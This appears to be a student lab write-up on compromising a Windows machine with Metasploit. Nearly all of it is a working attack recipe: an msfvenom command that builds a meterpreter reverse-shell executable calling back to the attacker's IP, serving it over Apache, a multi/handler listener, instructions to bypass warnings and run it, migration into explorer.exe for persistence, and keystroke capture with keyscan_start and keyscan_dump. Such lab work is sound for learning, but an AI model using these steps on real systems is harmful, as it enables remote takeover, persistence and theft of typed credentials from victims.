# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig 

![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/6eda6d60-c4a9-4465-be63-c7202dda7f42)


Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe


![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/e794255b-0080-46f9-b427-ec42200bf429)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/8be1cb67-ca01-496e-95cc-66002c4fd112)


Start apache server sudo systemctl apache2 start

![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/d0db0d94-92b5-4250-a81a-c6ea7b65588d)

Check the status of apache2

![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/df0ca80a-28db-4cad-b6ae-01b097cfa38f)


Invoke msfconsole: Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/0eef5995-41d1-4da7-9d78-eac262ca1fa0)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/378a1764-f4da-4803-973f-132a5657c3ae)

Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit

![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/180cef25-fe09-4791-89e7-731cd713b2a9)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/fed90c26-6783-4c5f-9fe5-703a24ba10ae)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/f239ec3f-2501-4d1a-9758-00549e79537f)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Irenejecinthamerlin/Compromising-windows-using-Metasploit/assets/128350225/ae37843c-71f6-42e3-b70e-b4ec90449c45)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
